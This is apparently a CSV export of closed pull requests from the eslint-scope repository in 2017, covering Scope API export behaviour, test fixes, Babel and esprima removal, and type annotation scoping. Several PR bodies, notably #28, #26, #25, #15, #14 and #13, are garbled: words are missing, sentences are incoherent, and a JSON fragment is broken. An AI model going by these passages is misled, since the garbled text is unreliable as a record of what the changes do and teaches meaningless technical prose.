ID,State,Time Created,Time Updated,Time Closed,Username,User ID,Author Association,Title,Body
31,closed,2017-04-10T16:49:22Z,2017-04-11T14:07:24Z,2017-04-11T14:07:21Z,vitorbal,626038,MEMBER,Fix: restore previous Scope API export behavior,This fixes a divergence between the exported API of `eslint-scope` and `escope`. Previously<c> with `escope`<c> the following code would return the Scope class:<\r><\n>```js<\r><\n>> require('escope').Scope<\r><\n>[Function: Scope]<\r><\n>```<\r><\n><\r><\n>However<c> with `eslint-scope` this returns an object that has a key `Scope` in it:<\r><\n>```js<\r><\n>> require('eslint-scope').Scope<\r><\n>{ Scope: [Function: Scope]<c><\r><\n> GlobalScope: [Function: GlobalScope]<c><\r><\n> ModuleScope: [Function: ModuleScope]<c><\r><\n> FunctionExpressionNameScope: [Function: FunctionExpressionNameScope]<c><\r><\n> CatchScope: [Function: CatchScope]<c><\r><\n> WithScope: [Function: WithScope]<c><\r><\n> TDZScope: [Function: TDZScope]<c><\r><\n> BlockScope: [Function: BlockScope]<c><\r><\n> SwitchScope: [Function: SwitchScope]<c><\r><\n> FunctionScope: [Function: FunctionScope]<c><\r><\n> ForScope: [Function: ForScope]<c><\r><\n> ClassScope: [Function: ClassScope] }<\r><\n>```<\r><\n><\r><\n>This happened during the refactoring from ES6 module syntax to `module.exports`<c> because `Scope` was the default export of `lib/scope.js`. Here's the change: https://github.com/eslint/eslint-scope/commit/019441e57cfe34d6acfe299b7b98d4bb9b8f4c3f#diff-7147267f980ceb48bd26aa2b36b061f2L132<\n>
29,closed,2017-04-02T21:34:54Z,2017-04-10T16:51:14Z,2017-04-10T16:51:11Z,soda0289,2373964,MEMBER,Fix: Modify tests that contain invalid ES6 syntax,Tests contained duplicate variable names and and parens around object destructing. This commit also causes the code coverage to drop. I am working on increasing coverage as well and will submit a second PR.<\n>
28,closed,2017-04-02T17:14:16Z,2017-04-02T17:50:15Z,2017-04-02T17:40:38Z,soda0289,2373964,MEMBER,Scope decorators,This PR for to be scoped and for to work correctly.<\n>
26,closed,2017-03-26T19:57:32Z,2017-04-02T17:38:52Z,2017-04-02T17:38:52Z,soda0289,2373964,MEMBER,Scope Type Annotations,This commit allows for type annotations in variable declarations and and declarations to allows for the to with to the type annotation not define type annotations "typeAnnotation": {<\r><\n> "type": "TypeAnnotation"<c><\r><\n> "loc": {<\r><\n> "start": {<\r><\n> "line": 3<c><\r><\n> "column": 11<\r><\n> }<c><\r><\n> "end": {<\r><\n> "line": 3<c><\r><\n> "column": 14<\r><\n> }<\r><\n> }<c><\r><\n> "range": [<\r><\n> 37<c><\r><\n> 40<\r><\n> ]<c><\r><\n> "typeAnnotation": {<\r><\n> "type": "TSTypeReference"<c><\r><\n> "range": [<\r><\n> 37<c><\r><\n> 40<\r><\n> ]<c><\r><\n> "loc": {<\r><\n> "start": {<\r><\n> "line": 3<c><\r><\n> "column": 11<\r><\n> }<c><\r><\n> "end": {<\r><\n> "line": 3<c><\r><\n> "column": 14<\r><\n> }<\r><\n> }<c><\r><\n> {<\r><\n> "type": "range": [<\r><\n> 37<c><\r><\n> 40<\r><\n> ]<c><\r><\n> "loc": {<\r><\n> "start": {<\r><\n> "line": 3<c><\r><\n> "column": 11<\r><\n> }<c><\r><\n> "end": {<\r><\n> "line": 3<c><\r><\n> "column": 14<\r><\n> }<\r><\n> }<c><\r><\n> "name": "Foo"<\r><\n> }<\r><\n> }<\r><\n> and type use the property id to define the for the type annotation not typeName. Maybe with that convention.<\n>
25,closed,2017-03-20T22:16:47Z,2018-10-29T21:55:00Z,2018-10-29T21:54:59Z,corbinu,533625,CONTRIBUTOR,WIP: Merge in esrecurse and estraverse,This one is going to take a bit of debate I am so I to just an of it would look This is a to I and is the to I in and their respective tests. I updated them both to eslint and I stripped out all code that wasn't used either eslint-scope eslint actually out to be quite a lot) and moved the syntax options into their own file. <\r><\n><\r><\n>This would be I it quite a bit more for the removes the for to be eslint as I pulled in the eslint visitor function. <\r><\n><\r><\n>I have created an example branch for eslint here: https://github.com/corbinu/eslint/tree/eslint-scope-4<\r><\n>Which removes estravserse as a dep and removes the Travserser class. All tests pass.<\r><\n><\r><\n>However it should be noted that no part of eslint-scope actually depends on the Traverser any more it would just as to move that into eslint itself.<\r><\n><\r><\n>This is just a discussion point so for now I have disabled the JS Doc rule. I look forward to hearing everybody's thoughts<\r><\n><\r><\n>@nzakas @JamesHenry @soda0289 @ilyavolodin<\n>
24,closed,2017-03-17T22:05:54Z,2017-03-17T22:09:07Z,2017-03-17T22:09:04Z,ilyavolodin,1380062,MEMBER,Chore: Add files section to package.json,Package.json was missing `files` section<c> which prevents the release.<\n>
22,closed,2017-03-11T23:32:01Z,2017-03-12T18:35:53Z,2017-03-12T18:35:29Z,corbinu,533625,CONTRIBUTOR,Chore: Remove estraverse and move syntax options in,Fix lintingAs #17 pointed out estraverse is only a dependency for list of possible syntax strings which is probably not necessary so I just pulled them in.<\n>
21,closed,2017-03-11T23:01:27Z,2017-03-11T23:36:02Z,2017-03-11T23:36:00Z,not-an-aardvark,11638619,MEMBER,Upgrade: eslint-config-eslint to 4.0.0,This upgrades eslint-config-eslint to v4.0.0<c> and fixes all linting errors. Most of the errors were fixed by ESLint's autofixer.<\n>
20,closed,2017-02-22T19:15:30Z,2017-03-11T22:31:01Z,2017-03-11T22:30:53Z,corbinu,533625,CONTRIBUTOR,Chore: Rename src to lib and test to tests,Renames src to lib and test to tests. It also updates the .gitignore based on whats in the eslint repo and removes .npmignore as they were interfering with the rename. <\r><\n><\r><\n>This should be the last chore to bring it up to spec!<\n>
19,closed,2017-02-22T18:34:53Z,2017-02-22T19:02:18Z,2017-02-22T19:02:18Z,corbinu,533625,CONTRIBUTOR,Chore: Remove esprima,@JamesHenry Really sorry about that I changed the message but didn't realize I needed to say "reword" and not "pick" when I did so. Still getting used to rebase<\n>
18,closed,2017-02-22T18:23:43Z,2017-02-22T18:28:28Z,2017-02-22T18:28:25Z,JamesHenry,900523,MEMBER,Revert "Chore: Remove esprima",Reverts eslint/eslint-scope#13<\n>
16,closed,2017-02-11T19:47:37Z,2017-02-11T20:29:39Z,2017-02-11T20:17:04Z,corbinu,533625,CONTRIBUTOR,Update travis config to latest node supported by eslint and install peers,Update travis config to latest node supported by eslint and install peers so that typescript will be installed<\r><\n><\r><\n>This should fix failing tests on the other pending PRs<\r><\n><\n>
15,closed,2017-02-11T02:17:44Z,2017-02-16T15:57:15Z,2017-02-16T15:57:15Z,soda0289,2373964,MEMBER,Add Makefile.js and eslint,have the lint target disabled until the babel is removed. The test run but depend on is on the
14,closed,2017-02-10T18:25:13Z,2017-02-16T18:07:53Z,2017-02-11T20:37:19Z,corbinu,533625,CONTRIBUTOR,Chore: Convert to ES6 that is supported on Node 4 commonjs modules and remove Babel,I to have the rebase. Think the issue was I never should have merged first. <\r><\n><\r><\n>This removes Babel<c> converts to commonjs modules and removes other ES6 features not supported on Node 4. I think it was removes and on
13,closed,2017-02-10T06:57:03Z,2017-02-22T18:32:15Z,2017-02-22T18:22:07Z,corbinu,533625,CONTRIBUTOR,Chore: Remove esprima,on and should and replaces it with espree in all the tests. <\r><\n><\r><\n>It currently fails on two tests that resolve around the use of "with" I am not sure if there is a simple fix if that with is not supported in strict mode if these should simply
12,closed,2017-02-10T05:17:17Z,2017-02-10T16:16:25Z,2017-02-10T13:08:30Z,corbinu,533625,CONTRIBUTOR,Remove browserify and jsdoc,Remove browserify and jsdoc<\n>
11,closed,2017-02-10T05:07:49Z,2017-02-10T19:06:06Z,2017-02-10T18:21:11Z,corbinu,533625,CONTRIBUTOR,Convert to ES6 that is supported on Node 4 commonjs modules and remove Babel,Lets try this one more time<\r><\n><\r><\n>This removes Babel<c> converts to commonjs modules and removes other ES6 features not supported on Node 4. I think it was all destructuring.<\r><\n><\r><\n>Updated version of #8 which removes .defaults and rebased on master<\n>
